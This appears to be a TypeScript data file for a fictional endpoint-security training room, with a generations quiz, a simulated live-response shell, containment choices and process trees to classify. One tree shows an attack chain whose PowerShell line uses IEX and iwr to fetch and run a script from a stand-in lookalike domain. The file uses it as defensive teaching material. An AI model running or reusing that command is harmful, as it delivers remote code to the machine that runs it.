import type { RoomExperience } from "./types";

// "Operation Black Box" for the "endpoint-security-fundamentals" room.
// Script: docs/campaign/17-endpoint-security-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Kestrel Credit Union (fictional). Lab data differs from the graded tasks: the
// generation sort uses incidents, not definitions (q1, q4); the live-response
// session and the isolation queue work other hosts than q3's spreading laptop;
// the process trees avoid q2's winword > cmd > powershell -Enc chain; and the
// alert drill is a Microsoft Defender alert, not la1's Falcon PowerShell
// detection or its flags (la1, f1).
export const ENDPOINT_SECURITY_FUNDAMENTALS: RoomExperience = {
  roomId: "endpoint-security-fundamentals",
  codename: "Operation Black Box",
  theme: "edr",
  handler: { name: "Hana Kobayashi", role: "EDR Engineer, Kestrel Credit Union" },
  briefing: [
    "Kestrel Credit Union. 2,400 laptops, 380 servers, and an EDR agent on every one of them.",
    "Each agent is a flight recorder: every process, file, connection and registry change, streamed to the cloud.",
    "Hana Kobayashi runs the EDR platform. When an alert fires, she doesn't guess. She opens the recording.",
    "Learn what each generation of endpoint defence catches, drive a live response shell, decide when isolation is worth its cost, and read an alert like she does.",
  ],
  mission: "Tell AV, NGAV, EDR and XDR apart by what they catch, run a Falcon Real Time Response session on a suspicious laptop, choose between isolation and lighter containment, read process trees, and take apart a Defender alert field by field.",
  estimate: "~45 min",
  look: { primary: "#34d399", secondary: "#60a5fa", warn: "#f43f5e" },
  scene: "blackbox",
  layout: "stage",
  stations: [
    {
      id: "gens",
      label: "Four Generations",
      topic: "Signature AV · NGAV · EDR · XDR",
      tagline: "Which generation would have caught each attack?",
      building: "archive",
      taskIds: ["ep-sec-r1", "ep-sec-q1", "ep-sec-q4"],
    },
    {
      id: "recorder",
      label: "The Flight Recorder",
      topic: "EDR telemetry · live response · isolation and what it costs",
      tagline: "Drive a live response shell, then decide what to isolate",
      building: "control",
      taskIds: ["ep-sec-r2", "ep-sec-q3"],
    },
    {
      id: "tree",
      label: "Read the Tree",
      topic: "A seven-step method for any EDR alert · process trees · command lines",
      tagline: "Tell admin tooling from an attack by who launched what",
      building: "lab",
      taskIds: ["ep-sec-r3", "ep-sec-q2"],
    },
    {
      id: "alert",
      label: "The Alert",
      topic: "Reading a real Falcon detection end to end",
      tagline: "Read the detection the way Hana would",
      building: "ticket",
      taskIds: ["ep-sec-la1", "ep-sec-f1"],
      boss: true,
    },
  ],
  personas: {
    "ep-sec-q1": { name: "Hana Kobayashi", role: "EDR Engineer", line: "The board asks why we replaced antivirus. One sentence." },
    "ep-sec-q2": { name: "Hana Kobayashi", role: "EDR Engineer", line: "Word, then cmd, then encoded PowerShell. What am I looking at?" },
    "ep-sec-q3": { name: "Hana Kobayashi", role: "EDR Engineer", line: "It's spreading from that laptop right now. First move?" },
    "ep-sec-q4": { name: "Hana Kobayashi", role: "EDR Engineer", line: "And XDR. What does it add?" },
  },
  briefings: {
    // ── Reading 1: four generations ──
    "ep-sec-r1": [
      {
        kind: "sort",
        title: "Which Generation Catches It?",
        prompt: "Four real-world attacks. For each, name the earliest generation of endpoint defence that would reliably catch it.",
        buckets: [
          { id: "av", label: "Signature AV" },
          { id: "ngav", label: "NGAV (behaviour, ML)" },
          { id: "edr", label: "EDR (recorded telemetry)" },
          { id: "xdr", label: "XDR (cross-domain)" },
        ],
        items: [
          { id: "a", text: "A five-year-old banking trojan, unchanged, arriving on a USB stick", bucket: "av", why: "Its exact bytes are in every signature database. The oldest generation is enough." },
          { id: "b", text: "Brand-new ransomware, never seen before, starting to rename and encrypt files in bulk", bucket: "ngav", why: "No signature exists yet, but 'encrypt everything fast' is a behaviour NGAV blocks." },
          { id: "c", text: "An intruder using only built-in tools (PowerShell, PsExec) over three weeks, found by hunting back through process history", bucket: "edr", why: "Nothing to block at any single moment. Only a recording of everything lets you find and rebuild it." },
          { id: "d", text: "A phishing email, a stolen sign-in token, then files downloaded from SharePoint by an unfamiliar IP", bucket: "xdr", why: "Email, identity and cloud: three domains. XDR stitches them into one incident." },
          { id: "e", text: "Malware that runs only in memory, injected into a legitimate process", bucket: "ngav", why: "No file to scan; memory scanning and exploit prevention are NGAV features." },
        ],
      },
    ],
    // ── Reading 2: the flight recorder ──
    "ep-sec-r2": [
      {
        kind: "terminal",
        title: "Live Response",
        prompt: "A behavioural detection fired on KCU-LT-0457 (r.patel, mortgage team). You have a Falcon Real Time Response shell on it. Find the process, see who it talks to, and stop it without taking the laptop offline.",
        shell: "cmd",
        host: "RTR KCU-LT-0457 C:\\>",
        commands: [
          { match: "ps", help: "ps                                                 running processes with their image paths",
            output: "Name                Id    Path\n----                --    ----\nexplorer.exe        4412  C:\\Windows\\explorer.exe\nmsedge.exe          5280  C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\nOUTLOOK.EXE         5536  C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\nmsupdate.exe        6120  C:\\Users\\r.patel\\AppData\\Local\\Temp\\msupdate.exe\nCSFalconService.exe 2232  C:\\Program Files\\CrowdStrike\\CSFalconService.exe" },
          { match: "netstat(\\s+-ano)?", help: "netstat                                            network connections with the owning PID",
            output: "  Proto  Local Address          Foreign Address        State           PID\n  TCP    10.30.8.57:51522       198.51.100.150:443     ESTABLISHED     6120\n  TCP    10.30.8.57:51530       52.97.146.162:443      ESTABLISHED     5536\n  TCP    10.30.8.57:51544       13.107.21.200:443      ESTABLISHED     5280" },
          { match: "filehash\\s+.*msupdate\\.exe", help: "filehash C:\\Users\\r.patel\\AppData\\Local\\Temp\\msupdate.exe   hashes for threat intel",
            output: "MD5:    5d41402abc4b2a76b9719d911017c592\nSHA256: 7c0fa8b4a2e94c1f6d3b8e5a09f21c47d6be83a51f0c94e2d7a63b18c5e90f42" },
          { match: "kill\\s+6120", help: "kill <PID>                                         end one process (the host stays online)",
            output: "Process 6120 killed." },
        ],
        objectives: [
          { id: "pid", task: "Which process runs from the user's Temp folder? Give its PID.", hint: "ps", answer: ["6120"], why: "A program named like a Windows updater, running from AppData\\Local\\Temp. Real updates don't live there." },
          { id: "ip", task: "Which external address is it connected to?", hint: "netstat", answer: ["198.51.100.150", "198.51.100.150:443"], why: "PID 6120 holds a session to 198.51.100.150 on 443. The other two belong to Outlook and Edge." },
          { id: "kill", task: "Stop it without isolating the laptop. What command did you run?", hint: "kill <PID>", answer: ["kill 6120"], why: "A lighter containment: the user keeps working while you block the IP at the proxy and pull the file for analysis. If it spreads, isolate." },
        ],
      },
      {
        kind: "queue",
        title: "Isolate, or Something Lighter?",
        prompt: "Four hosts with suspicious activity. Isolation is one click, and it's also an outage. Choose for each one.",
        console: "Falcon · containment decisions · Kestrel CU",
        actions: [
          { id: "iso", label: "Network-contain now", tone: "contain" },
          { id: "light", label: "Lighter action first", tone: "escalate" },
        ],
        alerts: [
          { id: "fs", time: "02:14", severity: "Critical", rule: "Ransomware: mass file encryption", entity: "KCU-FS-02 (branch file server)",
            fields: [{ k: "files renamed", v: "18,400 in 6 min" }, { k: "extension", v: ".kcux" }, { k: "spread", v: "SMB writes to 3 other hosts" }],
            context: "A file server encrypting shares and writing to other hosts right now.", answer: "iso", why: "Active spread beats any outage. Contain now, tell the owner after." },
          { id: "dc", time: "09:40", severity: "High", rule: "Suspicious LDAP enumeration", entity: "KCU-DC-01 (domain controller)",
            fields: [{ k: "source account", v: "svc_scanner" }, { k: "process", v: "powershell.exe (signed script)" }, { k: "spread", v: "none seen" }],
            context: "One service account running unusual directory queries on a domain controller.", answer: "light", why: "Isolating a DC breaks sign-in for the whole credit union. Disable svc_scanner and investigate first." },
          { id: "atm", time: "11:05", severity: "Medium", rule: "Unsigned binary executed", entity: "KCU-ATM-MON-03 (ATM monitoring PC)",
            fields: [{ k: "binary", v: "vendor_diag.exe" }, { k: "network", v: "no external connections" }, { k: "owner", v: "Branch Operations" }],
            context: "An unsigned tool on the PC that watches the branch ATMs.", answer: "light", why: "Business-critical, no spread, no C2. Call the owner, kill the process if needed, and check whether it's a vendor tool." },
          { id: "dev", time: "15:22", severity: "High", rule: "C2 beacon + credential dumping", entity: "KCU-LT-0912 (developer laptop)",
            fields: [{ k: "lsass access", v: "yes" }, { k: "beacon", v: "every 60 s to 203.0.113.77" }, { k: "user", v: "standard" }],
            context: "A laptop beaconing out after touching LSASS memory.", answer: "iso", why: "Confirmed compromise with stolen credentials in play: one person loses an afternoon, the credit union loses nothing." },
        ],
      },
    ],
    // ── Reading 3: reading an EDR alert ──
    "ep-sec-r3": [
      {
        kind: "evidence",
        title: "Who Launched What?",
        prompt: "Three PowerShell-related process trees from the same morning. The child process is similar in each; the parent tells you the story.",
        choices: [
          { id: "ok", label: "Legitimate administration" },
          { id: "bad", label: "Attack" },
        ],
        items: [
          {
            id: "sccm",
            caption: "Falcon · process tree · KCU-LT-0301",
            screen: { type: "edrtree", host: "KCU-LT-0301", verdict: "Script signed by Kestrel IT; same job ran on 2,388 hosts today", nodes: [
              { depth: 0, name: "CcmExec.exe", detail: "Configuration Manager client (SYSTEM)" },
              { depth: 1, name: "powershell.exe", detail: "-NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1" },
            ] },
            answer: "ok",
            callouts: [
              { at: "tree", text: "Bypass and NoProfile look alarming alone. Launched by the ConfigMgr client running a signed script from its own folder, they are routine." },
              { at: "verdict", text: "The same signed job on almost every laptop: fleet management, not an intrusion." },
            ],
          },
          {
            id: "hta",
            caption: "Falcon · process tree · KCU-LT-0457",
            screen: { type: "edrtree", host: "KCU-LT-0457", verdict: "Only host in the fleet with this chain; outbound to 198.51.100.150", nodes: [
              { depth: 0, name: "OUTLOOK.EXE", detail: "user r.patel" },
              { depth: 1, name: "mshta.exe", detail: "https://kestrel-docs.example/view/rate-sheet.hta", bad: true },
              { depth: 2, name: "powershell.exe", detail: "-w hidden -c IEX (iwr https://kestrel-docs.example/a.ps1)", bad: true },
              { depth: 3, name: "msupdate.exe", detail: "written to %TEMP%, started", bad: true },
            ] },
            answer: "bad",
            callouts: [
              { at: "tree", text: "Outlook launched an HTML application from a lookalike domain, which downloaded and ran a script in memory, which dropped an executable. Each hop is a red flag." },
              { at: "verdict", text: "One host, one time, talking to the address you found in live response." },
            ],
          },
          {
            id: "task",
            caption: "Falcon · process tree · KCU-SQL-01",
            screen: { type: "edrtree", host: "KCU-SQL-01", verdict: "Runs nightly at 02:00 for 2 years; change CHG-2291", nodes: [
              { depth: 0, name: "svchost.exe", detail: "Task Scheduler · \\Kestrel\\SQL-Index-Maintenance" },
              { depth: 1, name: "powershell.exe", detail: "-NonInteractive -File D:\\DBA\\Scripts\\reindex.ps1 (signed)" },
            ] },
            answer: "ok",
            callouts: [
              { at: "tree", text: "A named scheduled task running a signed DBA script: the expected parent for automation." },
              { at: "verdict", text: "Two years of history and a change ticket. Baselines turn a scary flag into a known job." },
            ],
          },
        ],
      },
    ],
    // Drill before the graded Falcon alert: a Defender alert, field by field.
    "ep-sec-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Defender Alert",
        prompt: "Before the graded Falcon detection, read an alert from the other big EDR. Different names, same seven questions.",
        source: "Microsoft Defender XDR · advanced hunting · AlertInfo + AlertEvidence",
        fields: [
          { key: "Title", value: "Suspicious process injection observed", label: "What", note: "The detection name: step 1 of the method." },
          { key: "Severity", value: "High" },
          { key: "Category", value: "DefenseEvasion", label: "Tactic", note: "Defender's word for the ATT&CK tactic." },
          { key: "AttackTechniques", value: "[\"Process Injection (T1055)\"]", label: "Technique" },
          { key: "DetectionSource", value: "EDR", label: "Which engine", note: "EDR behavioural detection, not antivirus." },
          { key: "DeviceName", value: "kcu-lt-0622.kestrel.local", label: "Where", note: "Step 2: which machine, and what is its role?" },
          { key: "AccountName", value: "m.osei", label: "Who" },
          { key: "InitiatingProcessFileName", value: "rundll32.exe", label: "Parent", note: "Step 4: who launched what." },
          { key: "ProcessCommandLine", value: "rundll32.exe C:\\ProgramData\\vmsync\\vmsync.dll,DllRegisterServer", label: "Command line", note: "Step 3: a DLL from ProgramData, called by its export name." },
          { key: "SHA256", value: "3e9b7a0c41d2f85e6b17c09a4d38e2f1b5c6a7d80e9f1a2b3c4d5e6f70819a2b", label: "Hash", note: "Step 5: look it up in threat intel." },
          { key: "RemoteIP", value: "203.0.113.31", label: "Network evidence", note: "Step 6: follow-on activity." },
        ],
        summary: "Title, host, command line, parent, hash, follow-on: the same method works on any vendor. Now the graded Falcon detection.",
      },
    ],
  },
};
